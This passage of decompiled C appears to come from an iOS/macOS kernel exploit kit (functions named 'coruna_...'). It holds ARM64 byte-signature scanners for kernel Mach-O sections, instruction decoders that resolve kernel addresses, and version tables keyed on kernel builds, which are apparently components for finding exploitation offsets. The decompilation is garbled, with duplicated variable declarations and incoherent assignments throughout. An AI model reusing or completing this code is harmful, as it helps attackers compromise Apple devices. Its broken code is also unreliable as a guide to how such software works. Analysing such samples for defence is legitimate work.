  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  thread_attr = (char *)0x0;
  u = 0;
  if ((path != (char *)0x0) && (ptr = _strdup(path), ptr != (char *)0x0)) {
    addr = 0;
    off = 0;
    scratch = ptr;
    do {
      buf = _strsep(&scratch," ");
      err = _strcmp(buf,"-");
      handle = addr;
      if (err != 0) {
        err = _strcmp(buf,"+");
        if (err != 0) {
          err = _strcmp(buf,"..");
          if (err == 0) {
            host_info[addr] = 0xffff;
            if (addr < 0x7f) {
              addr = addr + 1;
              handle = off;
            }
          }
          else {
            handle = _strtol(buf,&thread_attr,0x10);
            host_info[addr] = (ushort)handle & 0xff;
            if (*thread_attr == '\0') {
              if (addr < 0x7f) {
                addr = addr + 1;
                handle = off;
              }
            }
            else {
              _free(ptr);
              u = 0;
              if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
                ___stack_chk_fail(u);
              }
              return;
            }
          }
        }
        else {
          handle = addr + 1;
        }
      }
      off = handle;
    } while (scratch != (char *)0x0);
    _free(ptr);
    scratch = val[1];
    scratch = (char *)*val;
    bootargs = val[2];
    u = coruna_kernel6544_via_cat(&scratch,host_info,addr,handle,size,flags_2);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail(u);
  }
  return;
}





void coruna_kernel6544_via_cat(long *handle,long addr_2,unsigned long arg,long off_3,int flags)
{
  unsigned long u;
  byte *ptr;
  int err;
  char err;
  ushort size;
  byte *buf;
  uint version;
  byte *str;
  byte err;
  long handle;
  char status;
  unsigned long port;
  byte *copy;
  short *lps14;
  byte *data;
  uint8_t kind[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t stack_guard;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t sa_saved;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t sa_new;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t path_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  version = (uint)arg;
  err = (char)arg;
  if (((arg == (long)err) && (handle[2] != 0)) && (handle[1] != 0)) {
    port = arg;
    if (0 < (int)version) {
      u = ((unsigned long)-version | 0xffffffff00000000) + arg;
      handle = (arg & 0xffffffff) + 1;
      do {
        version = version - 1;
        port = arg;
        if (*(short *)(addr_2 + (unsigned long)version * 2) != -1) break;
        arg = arg - 1;
        handle = handle + -1;
        port = u;
      } while (1 < handle);
    }
    path_buf = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_u64_pack13((err), (coruna_cat(
                                                  err,coruna_cat(err,err)))))))));
    cache_22 = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_u64_pack13((err), (coruna_cat(
                                                  err,coruna_cat(err,err)))))))));
    cache_24 = cache_22;
    cache_23 = path_buf;
    cache = cache_22;
    sa_new = path_buf;
    cache_21 = cache_22;
    cache_20 = path_buf;
    json_buf = cache_22;
    sa_saved = path_buf;
    work = cache_22;
    frame = path_buf;
    region = cache_22;
    stack_guard = path_buf;
    url_buf = cache_22;
    plist = path_buf;
    sa_new = cache_22;
    block_ctx = path_buf;
    tmp_buf = cache_22;
    path_buf = path_buf;
    block_ctx = cache_22;
    action = path_buf;
    sa_saved = cache_22;
    stack_guard = path_buf;
    host_info = cache_22;
    serial_buf = path_buf;
    action = cache_22;
    serial_buf = path_buf;
    scratch = cache_22;
    host_info = path_buf;
    thread_attr = cache_22;
    bootargs = path_buf;
    if (1 < err) {
      err = 0;
      do {
        handle = (long)*(short *)(addr_2 + (long)(char)err * 2);
        status = ~err + err;
        if (handle == -1) {
          path_buf = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_u64_pack13((status
                                                  ), (coruna_cat(status,coruna_cat(status,status)))))))));
          cache_22 = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_u64_pack13((status), (coruna_cat(status,coruna_cat(status,status)))))))
                                              ));
          cache_24 = cache_22;
          cache_23 = path_buf;
          cache = cache_22;
          sa_new = path_buf;
          cache_21 = cache_22;
          cache_20 = path_buf;
          json_buf = cache_22;
          sa_saved = path_buf;
          work = cache_22;
          frame = path_buf;
          region = cache_22;
          stack_guard = path_buf;
          url_buf = cache_22;
          plist = path_buf;
          sa_new = cache_22;
          block_ctx = path_buf;
          tmp_buf = cache_22;
          path_buf = path_buf;
          block_ctx = cache_22;
          action = path_buf;
          sa_saved = cache_22;
          stack_guard = path_buf;
          host_info = cache_22;
          serial_buf = path_buf;
          action = cache_22;
          serial_buf = path_buf;
          scratch = cache_22;
          host_info = path_buf;
          thread_attr = cache_22;
          bootargs = path_buf;
        }
        else {
          *(char *)((long)&host_info + handle) = status;
        }
        err = err + 1;
      } while ((int)(char)err < err + -1);
    }
    lps14 = (short *)(addr_2 + port * 2 + -2);
    handle = (long)*lps14;
    err = *(char *)((long)&host_info + handle);
    *(uint8_t *)((long)&host_info + handle) = 0;
    bootargs = handle[1];
    scratch = *handle;
    thread_attr = handle[2];
    kind = coruna_kernel6544_residual_247(&scratch,1);
    handle = kind;
    buf = (byte *)0x0;
    if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
    }
    return;
  }
done:
  buf = (byte *)0x0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
  }
  return;
}





uint64_t coruna_kernel6544_via_kernel6544_via_cat(uint64_t *val,char *path,uint64_t id_2,unsigned long arg)
{
  long handle;
  bool err;
  size_t ls3;
  uint16_t *ptr;
  uint64_t u;
  unsigned long size;
  unsigned long version;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  ls3 = _strlen(path);
  ptr = _malloc((ls3 + 2) * 2);
  if (ptr == (uint16_t *)0x0) {
    u = 0;
  }
  else {
    ptr[ls3 + 1] = 0;
    *ptr = 0;
    if (ls3 != 0) {
      size = 0;
      version = 1;
      do {
        ptr[version] = (ushort)(byte)path[size];
        err = version < ls3;
        size = version;
        version = (unsigned long)((int)version + 1);
      } while (err);
    }
    err = (arg & 0x20) != 0;
    handle = ls3 + 1;
    if (err) {
      handle = ls3 + 2;
    }
    scratch = val[1];
    scratch = *val;
    bootargs = val[2];
    u = coruna_kernel6544_via_cat(&scratch,ptr + (((uint)arg & 0x20) >> 5 ^ 1),handle,err,id_2,
                         arg);
    _free(ptr);
  }
  return u;
}





long coruna_kernel6544_via_nop_stub(long *handle,uint64_t val,int flags)
{
  unsigned long u;
  int err;
  unsigned long size;
  void *ptr;
  unsigned long version;
  uint8_t version[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t scratch;
  unsigned long port;
  
  bootargs = handle[1];
  scratch = *handle;
  thread_attr = handle[2];
  scratch = val;
  version = coruna_kernel6544_residual_247(&scratch,1);
  port = version;
  if ((port != 0) && (version != 0)) {
    u = port + version;
    size = (unsigned long)*(byte *)(*handle + 0x34);
    if (port + size <= u) {
      version = port;
      do {
        ptr = version;
        if ((flags == 0) || ((version & (long)(flags + -1)) == 0)) {
          coruna_nop_stub(*handle,ptr,size,version);
          err = _memcmp(ptr,&scratch,size);
          if (err == 0) {
            return (handle[1] - port) + version;
          }
        }
        version = version + 1;
        version = version + -1;
        version = (long)ptr + 1;
      } while ((long)ptr + 1 + size <= u);
    }
  }
  return 0;
}





void coruna_macho_cstring(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  
  coruna_macho_map_segsect(bootargs,handle,"__TEXT","__cstring");
  handle = coruna_kernel6544_via_kernel6544_via_cat(bootargs,size_3,0,0x21);
  if (handle != 0) {
    coruna_macho_map_segsect(scratch,handle,val,id_2);
    coruna_kernel6544_via_nop_stub(scratch,handle,*(uint8_t *)(handle + 0x34),1);
  }
  return;
}





void coruna_kernel6544_via_strsep(long handle)
{
  char *ptr;
  char *buf;
  int err;
  uint u;
  long handle;
  long addr;
  unsigned long size;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  uint8_t thread_attr[24];
  
  err = coruna_ctx_test_flag(*(uint64_t *)(handle + 0x118),8);
  if (err == 0) {
    if ((*(unsigned long *)(handle + 0x88) < 0x22581401900000) ||
       (err = coruna_ctx_test_flag(*(uint64_t *)(handle + 0x118),0x2000), err != 0)) {
      u = coruna_iosurface_gen_index(handle);
      coruna_macho_text_sect(scratch,handle);
      ptr = ".. 01 .. 8B 88 D0 38 D5 E8 00 00 B5";
      if (u != 1) {
        ptr = (char *)0x0;
      }
      buf = "6B FD 62 D3 7F 19 00 F1 .. .. .. 54";
      if (u < 2) {
        buf = ptr;
      }
      ptr = ".. FD .. D3 .. .. 00 F1 .. .. .. 54";
      if (u < 5) {
        ptr = buf;
      }
      addr = coruna_strsep(scratch,ptr,0,1);
      handle = 0xc;
      if (u < 2) {
        handle = -8;
      }
      if (addr == 0) {
        return;
      }
      size = addr + handle;
    }
    else {
      coruna_macho_text_sect(bootargs,handle);
      handle = coruna_strsep(bootargs,".. FD .. D3 .. 00 00 B5",0,1);
      if (handle == 0) {
        return;
      }
      size = handle + 8;
    }
  }
  else {
    coruna_macho_text_sect(thread_attr,handle);
    handle = coruna_strsep(thread_attr,"08 FD 64 D3 1F 21 00 F1 .. 00 00 54",0,1);
    if (handle == 0) {
      return;
    }
    size = handle + 0xc;
  }
  coruna_return_zero_1555c(handle,size & 0xfffffffffffffffc,1);
  return;
}





uint64_t coruna_iosurface_gen_index(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x70);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      return 4;
    }
    if (err == 0x1809) {
      return 2;
    }
    if (err == 0x1c1b) {
      return 3;
    }
  }
  else {
    if (err == 0x2258 || err == 0x225c) {
      return 5;
    }
    if (err == 0x2712) {
      return 6;
    }
  }
  return 0;
}





void coruna_ioservicegetmatchingservice_2(uint64_t val,unsigned long arg)
{
  coruna_return_zero_1555c(val,arg & 0xfffffffffffffffc,1);
  return;
}





void coruna_find_mod_init_func(uint64_t val)
{
  char *ptr;
  char *buf;
  uint u;
  unsigned long size;
  long handle;
  uint64_t scratch;
  unsigned long scratch;
  long bootargs;
  uint8_t thread_attr[8];
  long host_info;
  long serial_buf;
  uint64_t action;
  unsigned long bootargs;
  long block_ctx;
  
  u = coruna_iosurface_gen_index();
  coruna_macho_text_sect(&action,val);
  coruna_macho_map_segsect(thread_attr,val,"__DATA_CONST","__mod_init_func");
  if ((((host_info != 0 && serial_buf != 0) && (size = coruna_kernel_remote_trampoline(val), size != 0)) &&
      (bootargs < size)) && (size < block_ctx + bootargs)) {
    block_ctx = (bootargs - size) + block_ctx;
    bootargs = size;
  }
  ptr = "68 72 40 B9 08 01 19 32 68 72 00 B9";
  if (u != 1) {
    ptr = (char *)0x0;
  }
  buf = "68 82 40 B9 08 01 19 32 68 82 00 B9";
  if (u < 2) {
    buf = ptr;
  }
  scratch = bootargs;
  scratch = action;
  bootargs = block_ctx;
  handle = coruna_strsep(&scratch,buf,0,1);
  if ((handle != 0) &&
     (handle = coruna_return_zero_1555c(val,handle + 0xcU & 0xfffffffffffffffc,1), handle != 0)) {
    coruna_kernel_remote_trampoline(val,handle);
  }
  return;
}





uint64_t coruna_kernel6544_str_e0_03_15_aa_fe_03_13_aa(uint64_t val)
{
  uint u;
  long handle;
  unsigned long size;
  uint64_t version;
  unsigned long port;
  uint8_t scratch[24];
  
  coruna_macho_text_sect(scratch);
  handle = coruna_strsep(scratch,"E0 03 15 AA .. .. .. .. FE 03 13 AA",0,1);
  if ((handle != 0) && (handle = coruna_kernel6544_via_kernel6544_via_kernel6544_via_ioconnect_fd_setup(val,handle + 4), handle != 0)) {
    port = 0xfffffffffffffffc;
    do {
      u = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(val,handle + port + 4);
      if (((u & 0x9f000000) == 0x90000000) &&
         (size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(val,handle + port + 0xc),
         ((uint)(size >> 0x15) & 0x7ff) == 0x458)) {
        version = coruna_return_zero_1555c(val,handle + port + 4,1);
        return version;
      }
      port = port + 4;
    } while (port < 0xfc);
  }
  return 0;
}





long coruna_kernel6544_via_kernel6544_via_kernel6544_via_ioconnect_fd_setup(uint64_t val,long handle)
{
  unsigned long u;
  unsigned long size;
  
  size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup();
  if (((uint)size & 0x7c000000) == 0x14000000) {
    u = (unsigned long)((uint)size & 0x1ffffff);
    if ((size & 0x2000000) != 0) {
      u = size | 0xfffffffffe000000;
    }
    if (u != 0) {
      return handle + u * 4;
    }
  }
  return 0;
}





void coruna_return_zero_1555c_stub(uint64_t val,uint64_t id_2)
{
  coruna_return_zero_1555c(val,id_2,1);
  return;
}





long coruna_return_zero_1528c(long handle,uint32_t *size)
{
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  uint64_t scratch;
  long bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  long serial_buf;
  long action;
  
  off = *(long *)(handle + 0x118);
  err = coruna_ctx_test_flag(off,0x20);
  if (err == 0) {
    handle = coruna_kernel6544_str_e0_03_15_aa_fe_03_13_aa(handle);
    if (handle == 0) {
      return 0;
    }
    scratch = 8;
fail:
    *size = (int)scratch;
  }
  else {
    coruna_macho_text_sect(&host_info,*(uint64_t *)(&k_kernel_slot_19f8 + off));
    bootargs = serial_buf + action + -0x20000;
    action = 0x20000;
    scratch = host_info;
    thread_attr = 0x20000;
    serial_buf = bootargs;
    handle = coruna_strsep(&scratch,"2B 09 40 B9 4B 39 0B 8B",0,1);
    if ((handle != 0) && (handle = coruna_return_zero_1555c(handle,handle + -0x28,1), handle != 0)) {
      u = coruna_kernel_remote_trampoline(handle,handle + -8);
      addr = coruna_ptr_canonicalize(off,u);
      if ((addr != 0) &&
         ((err = coruna_kernel6544_via_fcntl_1bf84(off,u,&scratch), err != 0 && ((int)scratch - 1U < 0x20))))
      {
        handle = coruna_kernel_remote_trampoline(handle,handle);
        off = coruna_ptr_canonicalize(off,handle);
        if (off != 0) {
          goto fail;
        }
      }
    }
    handle = 0;
  }
  return handle;
}





unsigned long coruna_kernel6544_str_5f_00_00_71_20_01_00_54(long arg,uint64_t val,uint64_t n)

{
  char *ptr;
  int flags;
  long serial_10;
  long base;
  unsigned long version;
  uint8_t scratch[24];
  
  flags = coruna_iosurface_gen_index();
  coruna_macho_text_sect(scratch,arg);
  ptr = (char *)0x0;
  if (flags != 0) {
    ptr = "5F 00 00 71 20 01 00 54";
  }
  serial_10 = coruna_strsep(scratch,ptr,0,0);
  version = 0;
  if ((((serial_10 != 0) && (base = coruna_return_zero_1555c(arg,serial_10 + 8,1), version = 0, base != 0)) &&
      (serial_10 = coruna_return_zero_1555c(arg,serial_10 + 0x18,1), version = 0, serial_10 != 0)) &&
     (version = coruna_kernel6544_residual_256(*(uint64_t *)(arg + 0x118),serial_10,val), (int)version != 0)) {
    flags = coruna_kernel6544_residual_256(*(uint64_t *)(arg + 0x118),base,n);
    version = (unsigned long)(flags != 0);
  }
  return version;
}





long coruna_return_zero_154a0(long handle,int flags)
{
  long handle;
  char *ptr;
  char *buf;
  uint u;
  long addr;
  uint64_t size;
  uint8_t scratch[24];
  
  if (flags < 1) {
    handle = handle + (long)flags * 8;
    if (*(long *)(&k_kernel_slot_1960 + handle) != 0) {
      return *(long *)(&k_kernel_slot_1960 + handle);
    }
    if (flags == 0) {
      size = *(uint64_t *)(&k_kernel_slot_19f8 + handle);
      u = coruna_iosurface_gen_index(size);
      coruna_macho_text_sect(scratch,size);
      ptr = "09 .. 00 F9 E1 03 00 32 00 00 80 52";
      if (u != 1) {
        ptr = (char *)0x0;
      }
      buf = "09 .. 00 F9 00 00 80 52 E1 03 00 32";
      if (u < 2) {
        buf = ptr;
      }
      addr = coruna_strsep(scratch,buf,0,0);
      if (addr == 0) {
        return 0;
      }
      addr = coruna_kernel6544_via_kernel6544_via_kernel6544_via_ioconnect_fd_setup(size,addr + 0xc);
      if (addr == 0) {
        return 0;
      }
      *(long *)(&k_kernel_slot_1960 + handle) = addr;
      return addr;
    }
  }
  return 0;
}





long coruna_return_zero_1555c(uint64_t val,unsigned long arg,int flags)
{
  uint u;
  int err;
  uint size;
  unsigned long version;
  uint64_t port;
  unsigned long tag;
  long handle;
  bool err;
  
  if ((arg & 3) == 0) {
    version = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup();
    u = (uint)version;
    if (u == 0xd503201f) {
      port = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(val,arg + 4);
      u = (uint)port >> 5;
      version = (unsigned long)(u & 0x7ffff) << 2;
      if ((u & 0x40000) != 0) {
        version = version | 0xfffffffffff00000;
      }
      if (((uint)((unsigned long)port >> 0x18) & 0xff) != 0x58) {
        return 0;
      }
      return version + arg + 4;
    }
    if ((u & 0x9f000000) == 0x90000000) {
      handle = (arg & 0xfffffffffffff000) +
              (long)(int)(u >> 0x11 & 0x3000 | (u >> 5) << 0xe);
    }
    else {
      if (((u & 0x9f000000) != 0x10000000) ||
         (err = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(val,arg + 4), err != -0x2afcdfe1)) goto fail;
      tag = (unsigned long)((uint)(version >> 3) & 0x1ffffc | u >> 0x1d & 3);
      if ((version >> 3 & 0x100000) != 0) {
        tag = tag | 0xffffffffffe00000;
      }
      handle = tag + arg;
    }
    err = false;
    u = u & 0x1f;
    version = arg + 0x20;
    while( true ) {
      arg = arg + 4;
      size = coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(val,arg);
      if (((size & 0x7f000000) == 0x11000000) && (!err)) {
        if ((size >> 5 & 0x1f) == u) {
          tag = (unsigned long)(size >> 10 & 0xfff);
          if ((size & 0xc00000) != 0) {
            tag = tag << 0xc;
          }
          handle = tag + handle;
          if (flags == 0) {
            return handle;
          }
          if (u != (size & 0x1f)) {
            return handle;
          }
          err = true;
        }
        else {
          err = false;
        }
      }
      if (((size & 0xbfc00000) == 0xb9400000) && ((size >> 5 & 0x1f) == u)) break;
      if ((size & 0xffc00000) == 0xb9800000) {
        if ((size >> 5 & 0x1f) == u) {
          version = (unsigned long)(size >> 8 & 0x3ffc);
          goto done;
        }
      }
      else if (((size & 0xffc00000) == 0x39400000) && ((size >> 5 & 0x1f) == u)) {
        version = (unsigned long)(size >> 10 & 0xfff);
        goto done;
      }
      if (size == 0xd65f03c0) {
        return handle;
      }
      if (version < arg) {
        return handle;
      }
    }
    version = (unsigned long)(size >> 10 & 0xfff) << (size >> 0x1e);
done:
    handle = handle + version;
  }
  else {
fail:
    handle = 0;
  }
  return handle;
}





void coruna_host_kernel_version_1526c(char *path,unsigned long arg)
{
  mach_port_t host;
  uint u;
  int err;
  int *err;
  uint *ptr;
  size_t ls5;
  uint64_t scratch;
  size_t bootargs;
  char scratch [512];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  if (800.0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    scratch = k_kernel_rodata_word_3b4d8;
    bootargs = 0x200;
    err = _sysctl((int *)&scratch,2,scratch,&bootargs,(void *)0x0,0);
    if (err != 0) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  else {
    host = _mach_host_self();
    u = _host_kernel_version(host,scratch);
    if (u != 0) {
      u = u | 0x80000000;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  ls5 = _strlen(scratch);
  if (arg < ls5 + 1) {
    u = 0xad00c;
  }
  else {
    _strlcpy(path,scratch,arg);
    u = 0;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_parse_libsyscall_version(uint64_t *val,uint32_t *size,uint32_t *flags_2)
{
  int err;
  char *ptr;
  size_t ls3;
  int *err;
  uint64_t u;
  char *buf;
  uint64_t scratch;
  char scratch [512];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  if (k_kernel_rodata_word_3b4e0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    ___strlcpy_chk(scratch,k_kernel_kernelversionstring_slot,0x200,0x200);
    ls3 = _strlen(scratch);
    u = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
    }
    ___stack_chk_fail(u);
  }
  else {
    err = coruna_host_kernel_version_1526c(scratch,0x200);
    if (err == 0) {
      ptr = _strstr(scratch,"RELEASE");
      u = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_vm_page_info(vm_map_t arg,mach_vm_address_t arg_x,uint64_t *val)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  int bootargs [2];
  uint64_t thread_attr;
  uint64_t host_info;
  
  scratch = 8;
  lk1 = _mach_vm_page_info(arg,arg_x,1,bootargs,&scratch);
  if (lk1 == 0) {
    if (val != (uint64_t *)0x0) {
      *val = host_info;
    }
  }
  else {
    thread_attr = 0;
  }
  return thread_attr;
}





uint coruna_cpu_core_count(void)
{
  uint u;
  
  u = __get_cpu_capabilities();
  return u >> 0x10 & 0xff;
}





uint64_t coruna_kernel6544_via_cpu_capabilities_base(void)
{
  long handle;
  uint64_t u;
  
  handle = coruna_cpu_capabilities_base();
  u = 0;
  if (handle != 0) {
    u = *(uint64_t *)(handle + 0x38);
  }
  return u;
}





uint32_t coruna_host_page_size(void)
{
  mach_port_t lm1;
  kern_return_t lk2;
  uint32_t scratch[2];
  
  lm1 = _mach_host_self();
  lk2 = _host_page_size(lm1,(vm_size_t *)scratch);
  if (lk2 != 0) {
    scratch[0] = 0;
  }
  return scratch[0];
}





uint32_t coruna_task_info(task_name_t arg)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  integer_t bootargs [3];
  uint32_t thread_attr;
  
  scratch = 0x24;
  lk1 = _task_info(arg,0x16,bootargs,&scratch);
  if (lk1 != 0) {
    thread_attr = 0;
  }
  return thread_attr;
}





uint coruna_kernel6544_residual_250(void)
{
  uint64_t u;
  uint size;
  uint version;
  
  if (k_kernel_rodata_word_3b7b8 <= *(double *)k_kernel_dyldversionnumber_slot) {
    size = 0xfff;
    u = tpidr_el0;
    version = (uint)u;
  }
  else {
    size = 7;
    u = tpidrro_el0;
    version = (uint)u;
  }
  return size & version;
}





kern_return_t coruna_task_info_156e4(task_name_t arg,uint64_t *val,uint64_t *id_2)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  integer_t bootargs [38];
  uint64_t thread_attr;
  uint64_t scratch;
  
  scratch = 0x2a;
  lk1 = _task_info(arg,0x16,bootargs,&scratch);
  if (lk1 == 0) {
    if (scratch == 0x2a) {
      lk1 = 0;
      *val = thread_attr;
      *id_2 = scratch;
    }
    else {
      lk1 = 4;
    }
  }
  return lk1;
}





bool coruna_kernel6544_via_cpu_capabilities_base_2(uint32_t *size)
{
  long handle;
  
  handle = coruna_cpu_capabilities_base();
  if (handle != 0) {
    *size = *(uint32_t *)(handle + 0x80);
  }
  return handle != 0;
}





uint64_t coruna_iomfb_slot_read(uint size,uint64_t *val)
{
  uint64_t *ptr;
  uint32_t *buf;
  uint64_t u;
  
  u = 0xad009;
  if (size < 4) {
    u = 0xad001;
  }
  else {
    ptr = _calloc(0x10,1);
    if (ptr != (uint64_t *)0x0) {
      buf = _calloc((unsigned long)size,1);
      *ptr = buf;
      if (buf == (uint32_t *)0x0) {
        _free(ptr);
      }
      else {
        u = 0;
        *buf = 0xd3;
        *(uint32_t *)(ptr + 1) = 4;
        *(uint *)((long)ptr + 0xc) = size;
        *val = ptr;
      }
    }
  }
  return u;
}





uint64_t coruna_return_zero_15824(long *handle,uint size,uint flags_2,uint64_t *val)
{
  uint64_t u;
  uint size;
  long handle;
  uint version;
  
  u = 0xad001;
  if ((flags_2 & 0xff000000) == 0) {
    size = (size & 0x7f000000) - 0x1000000 >> 0x18;
    if (size < 0xc) {
      version = 1 << (unsigned long)(size & 0x1f);
      if ((version & 0xc07) == 0) {
        if ((version & 0x380) == 0) {
          if (size != 3) {
            return 0xad001;
          }
          size = 0xc;
        }
        else {
          size = flags_2 + 7 & 0xfffffffc;
        }
      }
      else {
        size = 4;
      }
      if (*(int *)((long)handle + 0xc) - *(uint *)(handle + 1) < size) {
        u = 0xad00c;
      }
      else {
        handle = *handle;
        *(uint *)(handle + (unsigned long)*(uint *)(handle + 1)) = flags_2 | size;
        size = (int)handle[1] + 4;
        *(uint *)(handle + 1) = size;
        version = (size & 0x7f000000) + 0xfc000000 >> 0x18;
        if (version - 4 < 3) {
          version = flags_2 + 3 & 0xfffffffc;
          _memcpy((void *)(handle + (unsigned long)size),val,(unsigned long)flags_2);
        }
        else {
          if (version != 0) {
            return 0;
          }
          *(uint64_t *)(handle + (unsigned long)size) = *val;
          version = 8;
        }
        u = 0;
        *(uint *)(handle + 1) = (int)handle[1] + version;
      }
    }
  }
  return u;
}





uint64_t coruna_memcpy_15934(long *handle,uint64_t *val,uint32_t *size)
{
  uint u;
  void *ptr;
  uint64_t size;
  
  size = 0xad001;
  if (((*handle != 0) && (u = *(uint *)(handle + 1), u != 0)) &&
     (*(int *)((long)handle + 0xc) != 0)) {
    ptr = _malloc((unsigned long)u);
    *val = ptr;
    if (ptr == (void *)0x0) {
      size = 0xad009;
    }
    else {
      _memcpy(ptr,(void *)*handle,(unsigned long)u);
      size = 0;
      *size = (int)handle[1];
    }
  }
  return size;
}





uint64_t coruna_free_15ed4(uint64_t *val)
{
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
  }
  *val = 0;
  val[1] = 0;
  _free(val);
  return 0;
}





uint coruna_pipe_open(int *flags)
{
  int err;
  uint u;
  int *err;
  uint *ptr;
  
  err = _pipe((int)flags);
  if (err == 0) {
    if ((*flags == -1) || (flags[1] == -1)) {
      u = 0x2802a;
    }
    else {
      u = 0;
    }
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





void coruna_fd_drain(int *flags)
{
  int err;
  uint u;
  ssize_t ls3;
  int *err;
  uint *ptr;
  uint8_t scratch[256];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  do {
    ls3 = _read(*flags,scratch,0x100);
  } while (0 < ls3);
  err = ___error();
  if (*err == 0x23) {
    u = 0;
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_call_fcntl(uint32_t *size)
{
  void (*ptr)(void);
  int err;
  unsigned long unaff_x30;
  
  err = coruna_fcntl(*size);
  if (err != 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_fcntl(size[1]);
  return;
}





uint coruna_fcntl(int flags)
{
  int err;
  uint u;
  int *err;
  uint *ptr;
  
  if (flags == -1) {
    u = 0xad001;
  }
  else {
    err = _fcntl(flags,0x49);
    if ((((err != -1) && (err = _fcntl(flags,1), err != -1)) &&
        (err = _fcntl(flags,2), err != -1)) &&
       ((err = _fcntl(flags,3), err != -1 && (err = _fcntl(flags,4), err != -1)))) {
      return 0;
    }
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_write(long handle,void *ctx,size_t len)
{
  uint u;
  int err;
  size_t ls3;
  int *err;
  uint *ptr;
  
  ls3 = _write(*(int *)(handle + 4),ctx,len);
  if ((long)ls3 < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
    if (ls3 != len) {
      u = 0x2803a;
    }
  }
  return u;
}





uint coruna_fd_read_full(int *flags,void *ctx,size_t len)
{
  uint u;
  int err;
  size_t ls3;
  int *err;
  uint *ptr;
  
  ls3 = _read(*flags,ctx,len);
  if ((long)ls3 < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
    if (ls3 != len) {
      u = 0x2803b;
    }
  }
  return u;
}





void coruna_mount_hfs_cb(uint64_t *val)
{
  int err;
  int *err;
  uint *ptr;
  uint u;
  
